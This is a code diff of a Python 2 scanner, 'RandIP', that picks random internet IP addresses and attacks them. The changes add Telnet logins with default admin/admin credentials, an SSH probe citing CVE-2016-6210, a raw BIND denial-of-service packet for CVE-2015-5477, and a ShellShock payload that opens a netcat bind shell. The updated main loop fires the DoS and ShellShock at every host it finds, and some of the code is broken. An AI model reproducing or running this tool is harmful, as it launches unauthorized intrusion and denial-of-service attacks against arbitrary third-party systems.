@@ -1,4 +1,4 @@
-#RandIP 0.9.4 beta#
+#RandIP 0.9.7 beta#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
@@ -37,8 +37,6 @@ def UnknownError():#Catch all unknown errors and do an Emergency exit#
 	print("sleeping for 5 seconds and then finishing exit")
 	time.sleep(5)
 	WriteLog()
-
-SOCKS_PORT = 9050
 
 a = []
 b = []
@@ -127,16 +125,16 @@ fp = open(logfile, 'w')
 #Tor_Connect()
 
 def tBindDOS():
-	print('Using CVE:2015-5477')
+	print('Using tBind CVE:2015-5477')
 	print('Sending packet to ' + address + ' ...')
 	payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock.sendto(payload, (address, 53))
-	print('Done.')
+	print('Done.\n')
 
 def ShellShock():
-	rport="80"
-	print('Using CVE:2014-6271(6278)')
+	rport=80
+	print('Using ShellShock CVE:2014-6271(6278)')
 	print('Sending packet to ' + address + '...')
 	payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
 	try:
@@ -152,8 +150,105 @@ def ShellShock():
 			serversocket.sendall(reply+"\n")
 			data = serversocket.recv(buff)
 			print(data)
+			print('Done.\n')
 	except:
 		pass
+
+def find_service_name():
+	global SSHio
+	global Telio
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.settimeout(10)
+	result = sock.connect_ex((address,22))
+	if result == 0:
+		print('SSH Possibly Open\n')
+		SSHio=1
+		time.sleep(2)
+	else:
+		print('SSH Closed\n')
+		SSHio=0
+		time.sleep(2)
+	result1 = sock.connect_ex((address,23))
+	if result1 == 0:
+		print('Telnet Possibly Open\n')
+		Telio=1
+		time.sleep(2)
+	else:
+		print('Telnet Closed\n')
+		Telio=0
+		time.sleep(2)
+
+
+def TelnetConnect():
+	#Default telnet connection using admin as user and password#
+	try:
+		telnettime=time.clock()
+		tn = telnetlib.Telnet(address, 3)
+		tn.read_until("login: ")
+		time.sleep(3)#Sometimes telnet takes a second after login#
+		tn.write('admin' + '\n')
+		tn.read_until('Password: ')
+		tn.write('admin' + '\n')
+		tn.write("ls\n")
+		tn.write("exit\n")
+		print tn.read_all()
+		d.append(tn.read_all())
+	except socket.error:
+		telend=time.clock()
+		totaltime = telend - telnettime
+		print(socket.error, 'Error Signing in or Telnet not accessible', address)
+		print '\n'
+		print(totaltime)
+		e.append(address)
+		pass
+	except EOFError:
+		print(EOFError, address)
+		d.append(address)
+		pass
+	except KeyboardInterrupt:
+		WriteLog()
+#				break
+
+
+def SSHConnect():
+	try:
+		print('Using CVE:2016-6210')
+		SSH = paramiko.SSHClient()
+		p = 'A'*25000
+		starttime=time.clock()
+		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		try:
+			SSH.connect(address, username='root', password=p)
+			stdin, stdout, stderr = client.exec_command('ls')
+			for line in stdout:
+				print '... ' + line.strip('\n')
+				client.close()
+				f.append(address)
+		except:
+			endtime=time.clock()
+			f.append(address)
+			total=endtime-starttime
+			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
+			print(total)
+	except socket.timeout:
+		print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
+		g.append(address)
+		pass
+	except socket.error:
+		print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
+		g.append(address)
+		pass
+	except paramiko.ssh_exception.SSHException:
+		print(paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address)
+		g.append(address)
+		pass
+	except paramiko.ssh_exception.AuthenticationException:
+		print(paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address)
+		g.append(address)
+		pass
+	except KeyboardInterrupt:
+		WriteLog()
+		#break
 
 for address in randip():
 	try:
@@ -191,77 +286,22 @@ for address in randip():
 			fpadr.write(req.text.encode('utf-8').strip())
 			fpadr.close()
 			hostlog.append('host.' + address)
+			print('Beginning Service Discovery\n')
+			find_service_name()
 			print('Beginning Telnet attempt on %s\n' % address)
-			#Default telnet connection using admin as user and password#
-			try:
-				telnettime=time.clock()
-				tn = telnetlib.Telnet(address, 3)
-				tn.read_until("login: ")
-				time.sleep(3)#Sometimes telnet takes a second after login#
-				tn.write('admin' + '\n')
-				tn.read_until('Password: ')
-				tn.write('admin' + '\n')
-				tn.write("ls\n")
-				tn.write("exit\n")
-				print tn.read_all()
-				d.append(tn.read_all())
-			except socket.error:
-				telend=time.clock()
-				totaltime = telend - telnettime
-				print(socket.error, 'Error Signing in or Telnet not accessible', address)
-				print '\n'
-				print(totaltime)
-				e.append(address)
-				pass
-			except EOFError:
-				print(EOFError, address)
-				d.append(address)
-				pass
-			except KeyboardInterrupt:
-				WriteLog()
-#				break
-			try:
-				print('Starting SSH Attempt on %s' % address)
-				print('Using CVE:2016-6210')
-				SSH = paramiko.SSHClient()
-				p = 'A'*25000
-				starttime=time.clock()
-				SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-				try:
-					SSH.connect(address, username='root', password=p)
-					stdin, stdout, stderr = client.exec_command('ls')
-					for line in stdout:
-						print '... ' + line.strip('\n')
-					client.close()
-					f.append(address)
-					tBindDOS()
-				except:
-					endtime=time.clock()
-					f.append(address)
-					total=endtime-starttime
-					print('Possible username root based on enumeration exploit...')
-					print(total)
-					tBindDOS()
-					ShellShock()
-			except socket.timeout:
-				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
-				g.append(address)
-				pass
-			except socket.error:
-				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
-				g.append(address)
-				pass
-			except paramiko.ssh_exception.SSHException:
-				print(paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address)
-				g.append(address)
-				pass
-			except paramiko.ssh_exception.AuthenticationException:
-				print(paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address)
-				g.append(address)
-				pass
-			except KeyboardInterrupt:
-				WriteLog()
-				break
+			if Telio == 1:
+				TelnetConnect()
+			elif Telio == 0:
+				print('Telnet port not open...skipping\n')
+			print('Starting SSH Attempt on %s' % address)
+			if SSHio == 1:
+				SSHConnect()
+			elif SSHio == 0:
+				print('SSH port not open...skipping')
+#Remote to Local DOS Exploits
+			tBindDOS()
+			ShellShock()
+#
 		except socket.timeout:
 			print(socket.timeout, '%s timeout' % address)
 			print '\n'
@@ -292,6 +332,11 @@ for address in randip():
 		except requests.exceptions.ReadTimeout:
 			print(requests.exceptions.ReadTimeout, address)
 			a.append(address)
+			pass
+		except requests.exceptions.TooManyRedirects:
+			print(requests.exceptions.TooManyRedirects, address)
+			a.append(address)
+			pass
 		except TypeError:
 			print(TypeError, address)
 			a.append(address)
